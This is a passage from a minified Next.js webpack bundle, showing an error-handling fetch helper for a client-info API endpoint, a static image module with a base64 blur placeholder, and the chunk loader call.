Error("HTTP error! status: " + t.status) } catch (e) { throw console.error("Error:", e), e } }, c = async () => { try { let e = await fetch(n + "/api/client-info"); return await e.json() } catch (e) { return console.error("Error fetching client info:", e), null } } }, 12080: function (e, t) { "use strict"; t.Z = { src: "/_next/static/media/analyse.9b6716d0.png", height: 2130, width: 1512, blurDataURL: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAYAAAAICAMAAADtGH4KAAAANlBMVEX+/v/k8Oeiw/+Er//q7PDw9+7X5eP5+fn8/Pz29vXz5Mre48hxo//a5Pna5fnV39jU2rv269rUXxsxAAAACXBIWXMAACE4AAAhOAFFljFgAAAANElEQVR4nB3FSRaAIAxEwS/EdAdwuv9lfVqbwpwHxoooEyFL5LXtLjL/5j2/njEK0Vbvq70lWQFbLo7OrwAAAABJRU5ErkJggg==", blurWidth: 6, blurHeight: 8 } } }, function (e) { e.O(0, [752, 866, 748, 785, 680, 663, 971, 117, 744], function () { return e(e.s = 80593) }), _N_E = e.O() }]);